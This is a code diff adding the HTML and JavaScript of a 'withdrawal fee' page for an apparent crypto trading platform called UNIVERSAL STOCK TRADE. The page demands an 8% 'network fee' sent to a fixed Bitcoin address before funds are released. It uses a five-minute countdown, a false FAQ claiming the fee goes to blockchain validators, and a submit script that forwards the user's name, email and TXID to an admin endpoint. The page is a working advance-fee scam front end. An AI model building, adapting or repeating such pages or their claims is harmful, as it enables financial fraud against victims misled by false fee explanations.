+      <path d="M68.9047 14.196C68.9047 12.765 69.1837 11.5185 69.7417 10.4565C70.2997 9.3945 71.0782 8.571 72.0772 7.986C73.0852 7.392 74.2597 7.095 75.6007 7.095C76.8067 7.095 77.8912 7.3245 78.8542 7.7835C79.8172 8.2425 80.5867 8.8995 81.1627 9.7545C81.7387 10.6005 82.0447 11.6175 82.0807 12.8055H78.7192C78.6832 11.8695 78.3817 11.163 77.8147 10.686C77.2477 10.209 76.5097 9.9705 75.6007 9.9705C74.5477 9.9705 73.7287 10.3395 73.1437 11.0775C72.5677 11.8155 72.2797 12.855 72.2797 14.196C72.2797 15.555 72.5677 16.608 73.1437 17.355C73.7287 18.102 74.5477 18.4755 75.6007 18.4755C76.5007 18.4755 77.2342 18.2595 77.8012 17.8275C78.3682 17.3955 78.6742 16.7475 78.7192 15.8835H82.0807C82.0177 17.0355 81.6982 18.021 81.1222 18.84C80.5462 19.65 79.7812 20.271 78.8272 20.703C77.8732 21.135 76.7977 21.351 75.6007 21.351C74.2687 21.351 73.0987 21.054 72.0907 20.46C71.0917 19.866 70.3087 19.0335 69.7417 17.9625C69.1837 16.8825 68.9047 15.627 68.9047 14.196Z" fill="white"/>
+      <path d="M54.099 14.196C54.099 12.765 54.378 11.5185 54.936 10.4565C55.503 9.3945 56.2905 8.571 57.2985 7.986C58.3065 7.392 59.481 7.095 60.822 7.095C62.154 7.095 63.3195 7.392 64.3185 7.986C65.3265 8.571 66.1095 9.3945 66.6675 10.4565C67.2255 11.5185 67.5045 12.765 67.5045 14.196C67.5045 15.627 67.2255 16.8825 66.6675 17.9625C66.1095 19.0335 65.3265 19.866 64.3185 20.46C63.3195 21.054 62.154 21.351 60.822 21.351C59.481 21.351 58.3065 21.054 57.2985 20.46C56.2905 19.866 55.503 19.0335 54.936 17.9625C54.378 16.8825 54.099 15.627 54.099 14.196ZM64.1295 14.196C64.1295 12.855 63.837 11.8155 63.252 11.0775C62.676 10.3395 61.866 9.9705 60.822 9.9705C59.769 9.9705 58.9455 10.3395 58.3515 11.0775C57.7665 11.8155 57.474 12.855 57.474 14.196C57.474 15.555 57.7665 16.608 58.3515 17.355C58.9455 18.102 59.769 18.4755 60.822 18.4755C61.866 18.4755 62.676 18.102 63.252 17.355C63.837 16.608 64.1295 15.555 64.1295 14.196Z" fill="white"/>
+      <path d="M48.7734 2L52.1212 2V21H48.8002L48.7734 2Z" fill="white"/>
+      <path d="M40.895 2C41.9632 2 42.9024 2.20446 43.7127 2.61337C44.5322 3.02229 45.1676 3.58699 45.6188 4.30746C46.07 5.01819 46.2956 5.8555 46.2956 6.81937C46.2956 7.77351 46.0608 8.62542 45.5912 9.3751C45.1308 10.1248 44.5046 10.6895 43.7127 11.0692C44.7164 11.4586 45.5129 12.0915 46.1022 12.9677C46.7007 13.8342 47 14.8468 47 16.0054C47 16.9985 46.779 17.8698 46.337 18.6195C45.9042 19.3692 45.2919 19.9534 44.5 20.372C43.7081 20.7907 42.7873 21 41.7376 21H32V2H40.895ZM40.4945 5.08148H35.3978V9.81322H40.4945C41.2403 9.81322 41.8158 9.59416 42.221 9.15603C42.6262 8.70817 42.8287 8.11427 42.8287 7.37433C42.8287 6.66359 42.6262 6.10377 42.221 5.69485C41.8158 5.28593 41.2403 5.08148 40.4945 5.08148ZM40.7017 12.8801H35.3978V17.9331H40.9088C41.7007 17.9331 42.3315 17.7141 42.8011 17.2759C43.2799 16.8281 43.5193 16.2342 43.5193 15.4942C43.5193 14.6861 43.2615 14.0484 42.7459 13.5811C42.2394 13.1138 41.558 12.8801 40.7017 12.8801Z" fill="white"/>
+      <defs>
+        <clipPath id="clipLogo0"><rect width="24" height="24" fill="white"/></clipPath>
+        <clipPath id="clipLogo1"><rect width="24" height="24" fill="white"/></clipPath>
+      </defs>
+    </svg>
+    <div class="shadow"></div>
+  </div>
+
+  <div class="ticker-container">
+    <script type="module" src="https://widgets.tradingview-widget.com/w/en/tv-ticker-tape.js"></script>
+    <tv-ticker-tape 
+      symbols="BINANCE:XRPUSDT,BINANCE:SOLUSDT,BINANCE:DOGEUSDT,BINANCE:BNBUSDT,COINBASE:XRPUSD,BINANCE:AVAXUSDT,BINANCE:PEPEUSDT,BINANCE:TRXUSDT,ICMARKETS:BTCUSD,BINANCE:BTCUSDC,BINANCE:LTCUSDT,COINBASE:DOGEUSD,BINANCE:TRUMPUSDT,BINANCE:TAOUSDT,BINANCE:CRVUSDT,BINANCE:AAVEUSDT" 
+      symbol-url="https://www.ustrader24.online/"
+      no-arrows>
+    </tv-ticker-tape>
+  </div>
+
+  <div class="page-header">
+    <div class="page-badge">
+      <span>🔗</span> Blockchain Network Fee
+    </div>
+    <h1>Complete blockchain payment</h1>
+    <p>Pay the network fee to process your withdrawal</p>
+  </div>
+
+  <div class="timer-card">
+    <div class="timer-row">
+      <div class="timer-label">
+        <span>⏱️</span> Payment window
+      </div>
+      <div class="timer-value" id="timerDisplay">04:59</div>
+    </div>
+    <div class="progress-track">
+      <div class="progress-fill" id="progressFill"></div>
+    </div>
+    <div class="timer-note">Complete payment before timer expires</div>
+  </div>
+
+  <div class="card">
+    <div style="font-weight: 600; margin-bottom: 12px;">Withdrawal summary</div>
+    <div class="summary-row">
+      <span class="summary-label">Withdrawal amount</span>
+      <span class="summary-value">€<span id="withdrawAmount">10,000.00</span></span>
+    </div>
+    <div class="summary-row">
+      <span class="summary-label">Network fee (<span id="feePercentDisplay">8</span>%)</span>
+      <span class="summary-value fee-value">€<span id="feeAmount">800.00</span></span>
+    </div>
+    <div class="summary-row payable-row">
+      <span class="summary-label payable-label">Payable amount:</span>
+      <span class="payable-amount">€<span id="payableAmount">800.00</span></span>
+    </div>
+  </div>
+
+  <div class="explanation-box">
+    <div class="explanation-title">
+      <span>❓</span> Quick Answer
+    </div>
+    <div class="explanation-text">
+      <strong>The fee is NOT deducted from your withdrawal amount.</strong> You receive the full €10,000.00. The extra amount covers blockchain network fees or processor costs.
+    </div>
+    <div class="explanation-text">
+      For crypto: networks require gas fees in native coins (BTC, ETH, TRX). These fees go to network validators, <strong>not to UNIVERSAL STOCK TRADE</strong>.
+    </div>
+    <div class="explanation-text">
+      For bank, card, cash: covers payment processors, bank charges, or courier services.
+    </div>
+  </div>
+
+  <div class="card">
+    <div style="font-weight: 600; margin-bottom: 16px;">Select payment method</div>
+    
+    <div class="gateway-option">
+      <div class="gateway-header">
+        <div class="gateway-info">
+          <span style="font-size: 18px;">₿</span>
+          <span class="gateway-name">Bitcoin (BTC)</span>
+          <span class="gateway-network">BTC Network</span>
+        </div>
+        <span class="check-icon">✓</span>
+      </div>
+      <div class="gateway-address">bc1qufx0c0ks9xew98fm8z5p34nmxvmrpwfqfu23v8</div>
+    </div>
+
+    <div class="address-box">
+      <code class="address-code" id="displayAddress">bc1qufx0c0ks9xew98fm8z5p34nmxvmrpwfqfu23v8</code>
+      <button class="copy-btn" id="copyAddressBtn">📋 Copy</button>
+    </div>
+
+    <div class="qr-wrapper">
+      <img class="qr-image" id="qrImage" src="https://api.qrserver.com/v1/create-qr-code/?size=110x110&data=bc1qufx0c0ks9xew98fm8z5p34nmxvmrpwfqfu23v8" alt="QR Code">
+    </div>
+  </div>
+
+  <div class="card">
+    <div style="font-weight: 600; margin-bottom: 16px;">Payment proof</div>
+    <div class="input-group">
+      <label class="input-label">Transaction ID (TXID)</label>
+      <input type="text" id="txidInput" class="input-field" placeholder="Paste blockchain transaction hash">
+    </div>
+    <div class="input-group">
+      <label class="input-label">Upload receipt</label>
+      <input type="file" id="receiptFile" class="input-field" accept="image/*,.pdf">
+      <div style="font-size: 10px; color:#6a6d75; margin-top: 6px;">Screenshot of payment confirmation</div>
+    </div>
+  </div>
+
+  <div class="warning-card">
+    <div class="warning-content">
+      <div class="warning-icon">⚠️</div>
+      <div>
+        <div class="warning-title">Important</div>
+        <div class="warning-text">This payment goes to the blockchain network, not to our platform. Withdrawal processes after fee verification (1–2 business days).</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="button-group">
+    <button class="btn-outline" id="cancelBtn">Cancel</button>
+    <button class="btn-wallet" id="connectWalletBtn">🔗 Connect Wallet</button>
+    <button class="btn-primary" id="submitBtn">Submit fee payment</button>
+  </div>
+  <div class="footer-note">UNIVERSAL STOCK TRADE • Secure blockchain gateway • <a href="mailto:support@ustrader24.online" style="color:#DA123E; text-decoration:none;">support@ustrader24.online</a></div>
+</div>
+
+<div id="productsPage" class="page-container">
+  <div class="page-header">
+    <div class="page-badge"><span>📦</span> Our Products</div>
+    <h1>Withdrawal Methods</h1>
+    <p>Choose how you want to receive your funds</p>
+  </div>
+  <div class="products-grid">
+    <div class="product-card"><div class="product-icon">₿</div><div class="product-title">Crypto Withdrawal</div><div class="product-description">Send crypto directly to your external wallet (Trust Wallet, MetaMask, Coinbase Wallet, etc.).</div><div><span class="fee-badge">Fee: 5-15%</span><span class="time-badge">Time: 15-60 min</span></div><div class="crypto-icons"><span class="crypto-icon">₿ BTC</span><span class="crypto-icon">Ξ ETH</span><span class="crypto-icon">◈ USDT</span><span class="crypto-icon">◈ BNB</span><span class="crypto-icon">◎ SOL</span></div></div>
+    <div class="product-card"><div class="product-icon">🏦</div><div class="product-title">Bank Withdrawal</div><div class="product-description">Convert your crypto to fiat and withdraw directly to your bank account.</div><div><span class="fee-badge">Fee: 5-15%</span><span class="time-badge">Time: 1-3 business days</span></div></div>
+    <div class="product-card"><div class="product-icon">💳</div><div class="product-title">Card Withdrawal</div><div class="product-description">Load funds directly onto your Visa or Mastercard.</div><div><span class="fee-badge">Fee: 5-15%</span><span class="time-badge">Time: 1-2 business days</span></div></div>
+    <div class="product-card"><div class="product-icon">✉️</div><div class="product-title">Cash Mailing</div><div class="product-description">Convert crypto to physical cash delivered via insured courier.</div><div><span class="fee-badge">Fee: 5-15%</span><span class="time-badge">Time: 3-7 business days</span></div></div>
+  </div>
+  <div class="button-group-page"><button class="back-btn" id="backFromProducts">← Back to Withdrawal</button></div>
+</div>
+
+<div id="resourcesPage" class="page-container">
+  <div class="page-header">
+    <div class="page-badge"><span>📚</span> Resources & Support</div>
+    <h1>Frequently Asked Questions</h1>
+    <p>Everything you need to know about withdrawals and fees</p>
+  </div>
+  <div class="faq-item"><div class="faq-question" data-faq="1"><span>❓ Why is the fee separate from my withdrawal amount?</span><span class="faq-toggle">▼</span></div><div class="faq-answer" id="faq1">The blockchain network requires "gas fees" paid in native coins. These fees go to network validators, not to UNIVERSAL STOCK TRADE.</div></div>
+  <div class="faq-item"><div class="faq-question" data-faq="2"><span>❓ What happens if my timer expires?</span><span class="faq-toggle">▼</span></div><div class="faq-answer" id="faq2">Your withdrawal request will be cancelled. Start a new withdrawal.</div></div>
+  <div class="faq-item"><div class="faq-question" data-faq="3"><span>❓ Why does the fee range from 5% to 15%?</span><span class="faq-toggle">▼</span></div><div class="faq-answer" id="faq3">Fees vary based on network congestion, bank costs, card fees, and courier distances.</div></div>
+  <div class="faq-item"><div class="faq-question" data-faq="4"><span>❓ How long does verification take?</span><span class="faq-toggle">▼</span></div><div class="faq-answer" id="faq4">1-2 business days after submitting TXID and receipt.</div></div>
+  <div class="faq-item"><div class="faq-question" data-faq="5"><span>❓ Do I need native coins in my wallet?</span><span class="faq-toggle">▼</span></div><div class="faq-answer" id="faq5">Yes. Without native coins (BTC/ETH/TRX), the blockchain will reject your transaction.</div></div>
+  <div class="faq-item"><div class="faq-question" data-faq="6"><span>❓ What wallets do you support?</span><span class="faq-toggle">▼</span></div><div class="faq-answer" id="faq6">Trust Wallet, MetaMask, Coinbase Wallet, Ledger, Trezor, and any BTC/ETH/TRC20/BEP20 wallet.</div></div>
+  <div class="card" style="margin-top: 16px;">
+    <div style="font-weight: 600; margin-bottom: 14px;">📞 Contact Support</div>
+    <div class="contact-item"><div class="contact-icon">📧</div><div class="contact-details"><div class="contact-label">Email</div><div class="contact-value">support@ustrader24.online</div></div><button class="copy-contact-btn" data-contact="support@ustrader24.online">Copy</button></div>
+    <div class="contact-item"><div class="contact-icon">📱</div><div class="contact-details"><div class="contact-label">WhatsApp / Phone</div><div class="contact-value">+44 7587 620916</div></div><button class="copy-contact-btn" data-contact="+447587620916">Copy</button></div>
+  </div>
+  <div class="button-group-page"><button class="back-btn" id="backFromResources">← Back to Withdrawal</button></div>
+</div>
+
+<div id="learnPage" class="page-container">
+  <div class="page-header">
+    <div class="page-badge"><span>📖</span> Learn Center</div>
+    <h1>Why does the blockchain charge a fee?</h1>
+    <p>Understanding why fees are separate from your withdrawal amount</p>
+  </div>
+  <div class="learn-section-detailed">
+    <h4>1. The Blockchain's "Fuel" Mechanism</h4>
+    <p>The blockchain network requires energy to process any transaction — crypto, bank transfer, card load, or cash mailing. This energy is paid using the <strong>native coin</strong> (BTC, ETH, TRX, BNB).</p>
+    <ul><li><strong>Your withdrawal value</strong> = passenger riding in a car</li><li><strong>Native coin</strong> = gasoline required to move the car</li></ul>
+    <h4>2. Why the Fee Varies (5-15%)</h4>
+    <p>Fees vary based on: network congestion, bank costs, card fees, and courier distances. UNIVERSAL STOCK TRADE passes the exact cost to you — never deducted from your withdrawal.</p>
+    <h4>Bottom line:</h4>
+    <p><strong>No native coin = no transaction</strong>, regardless of how much value you're withdrawing.</p>
+  </div>
+  <div class="button-group-page"><button class="back-btn" id="backFromLearn">← Back to Withdrawal</button></div>
+</div>
+
+<script>
+  // Page Navigation
+  const withdrawalPage = document.getElementById('withdrawalPage');
+  const productsPage = document.getElementById('productsPage');
+  const resourcesPage = document.getElementById('resourcesPage');
+  const learnPage = document.getElementById('learnPage');
+  const homeLogo = document.getElementById('homeLogo');
+  const productsLink = document.getElementById('productsLink');
+  const resourcesLink = document.getElementById('resourcesLink');
+  const learnLink = document.getElementById('learnLink');
+
+  function hideAllPages() {
+    withdrawalPage.style.display = 'none';
+    productsPage.style.display = 'none';
+    resourcesPage.style.display = 'none';
+    learnPage.style.display = 'none';
+  }
+
+  function showWithdrawalPage() { hideAllPages(); withdrawalPage.style.display = 'block'; }
+  function showProductsPage() { hideAllPages(); productsPage.style.display = 'block'; }
+  function showResourcesPage() { hideAllPages(); resourcesPage.style.display = 'block'; }
+  function showLearnPage() { hideAllPages(); learnPage.style.display = 'block'; }
+
+  withdrawalPage.style.display = 'block';
+  productsPage.style.display = 'none';
+  resourcesPage.style.display = 'none';
+  learnPage.style.display = 'none';
+
+  homeLogo.addEventListener('click', showWithdrawalPage);
+  productsLink.addEventListener('click', showProductsPage);
+  resourcesLink.addEventListener('click', showResourcesPage);
+  learnLink.addEventListener('click', showLearnPage);
+
+  document.getElementById('backFromProducts')?.addEventListener('click', showWithdrawalPage);
+  document.getElementById('backFromResources')?.addEventListener('click', showWithdrawalPage);
+  document.getElementById('backFromLearn')?.addEventListener('click', showWithdrawalPage);
+
+  // FAQ Accordion
+  document.querySelectorAll('.faq-question').forEach(question => {
+    question.addEventListener('click', () => {
+      const faqId = question.getAttribute('data-faq');
+      const answer = document.getElementById(`faq${faqId}`);
+      const toggle = question.querySelector('.faq-toggle');
+      if (answer) {
+        answer.classList.toggle('show');
+        if (toggle) toggle.style.transform = answer.classList.contains('show') ? 'rotate(180deg)' : 'rotate(0deg)';
+      }
+    });
+  });
+
+  // Copy Contact Buttons
+  document.querySelectorAll('.copy-contact-btn').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const text = btn.getAttribute('data-contact');
+      navigator.clipboard.writeText(text);
+      const original = btn.innerText;
+      btn.innerText = 'Copied!';
+      setTimeout(() => btn.innerText = original, 2000);
+    });
+  });
+
+  function formatWithComma(value) { return value.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
+
+  const withdrawBase = 10000;
+  const fixedFeePercent = 8;
+  document.getElementById('withdrawAmount').innerText = formatWithComma(withdrawBase);
+  document.getElementById('feePercentDisplay').innerText = fixedFeePercent;
+  document.getElementById('feeAmount').innerText = formatWithComma((withdrawBase * fixedFeePercent) / 100);
+  document.getElementById('payableAmount').innerText = formatWithComma((withdrawBase * fixedFeePercent) / 100);
+
+  let timeLeft = 5 * 60;
+  const timerDisplay = document.getElementById('timerDisplay');
+  const progressFill = document.getElementById('progressFill');
+  const totalTime = 5 * 60;
+  function updateTimer() {
+    const mins = Math.floor(timeLeft / 60);
+    const secs = timeLeft % 60;
+    timerDisplay.innerText = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+    progressFill.style.width = `${(timeLeft / totalTime) * 100}%`;
+    if (timeLeft > 0) { timeLeft--; setTimeout(updateTimer, 1000); }
+    else { timerDisplay.innerText = "Expired"; progressFill.style.width = "0%"; }
+  }
+  updateTimer();
+
+  document.getElementById('copyAddressBtn')?.addEventListener('click', () => {
+    navigator.clipboard.writeText(document.getElementById('displayAddress').innerText);
+    alert('Address copied');
+  });
+  
+  document.getElementById('connectWalletBtn')?.addEventListener('click', () => {
+    window.open('https://trustwallet.com/connect', '_blank');
+    alert('Redirecting to your external wallet.');
+  });
+  
+  document.getElementById('cancelBtn')?.addEventListener('click', () => { 
+    if (confirm('Cancel withdrawal?')) alert('Cancelled.'); 
+  });
+  
+  // ============================================================
+  // WORKING SUBMIT BUTTON - Sends notification to admin
+  // ============================================================
+  document.getElementById('submitBtn').addEventListener('click', async function() {
+    const txid = document.getElementById('txidInput').value;
+    const file = document.getElementById('receiptFile').files[0];
+    
+    if (!txid) {
+      alert('Please enter Transaction ID');
+      return;
+    }
+    if (!file) {
+      alert('Please upload payment receipt');
+      return;
+    }
+    
+    const submitBtn = document.getElementById('submitBtn');
+    const originalText = submitBtn.innerText;
+    submitBtn.innerText = 'Processing...';
+    submitBtn.disabled = true;
+    
+    // Get pending withdrawal data from sessionStorage
+    const pending = sessionStorage.getItem('pendingWithdrawal');
+    if (!pending) {
+      alert('No pending withdrawal found. Please start a new withdrawal.');
+      window.location.href = '/withdraw';
+      return;
+    }
+    
+    const withdrawalData = JSON.parse(pending);
+    const feeAmount = (withdrawalData.originalAmount * withdrawalData.feePercent) / 100;
+    
+    // Get user info from localStorage (Supabase session)
+    let userEmail = 'user@example.com';
+    let userName = 'User';
+    try {
+      const sessionKey = Object.keys(localStorage).find(key => key.includes('sb-') && key.includes('-auth-token'));
+      if (sessionKey) {
+        const session = JSON.parse(localStorage.getItem(sessionKey));
+        if (session?.user) {
+          userEmail = session.user.email;
+          userName = session.user.user_metadata?.full_name || session.user.email;
+        }
+      }
+    } catch(e) {
+      console.log('Could not get user session', e);
+    }
+    
+    try {
+      // Send notification to admin via Supabase Edge Function
+      const response = await fetch('https://xnnhoqvtooyipjvyfvms.supabase.co/functions/v1/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          notification_type: 'fee_payment_submitted',
+          event_data: {
+            user_name: userName,
+            user_email: userEmail,
+            amount: feeAmount,
+            txid: txid,
+            withdrawal_amount: withdrawalData.originalAmount,
+            method: withdrawalData.method,
+            gateway_address: document.getElementById('displayAddress')?.innerText || 'bc1qufx0c0ks9xew98fm8z5p34nmxvmrpwfqfu23v8',
+            timestamp: new Date().toISOString()
+          },
+          receipt_filename: file.name
+        })
+      });
+      
+      const result = await response.json();
+      console.log('Notification sent:', result);
+      
+      alert(`✅ Fee payment submitted successfully!\n\nTXID: ${txid}\nAmount: €${feeAmount.toFixed(2)}\n\nYour withdrawal will be processed within 1-2 business days.`);
+      
+      // Clear session storage and redirect to dashboard
+      sessionStorage.removeItem('pendingWithdrawal');
+      window.location.href = '/dashboard';
+      
+    } catch (error) {
+      console.error('Error submitting payment:', error);
+      alert('Failed to submit payment. Please try again or contact support.');
+      submitBtn.innerText = originalText;
+      submitBtn.disabled = false;
+    }
+  });
+</script>
+</body>
+</html>
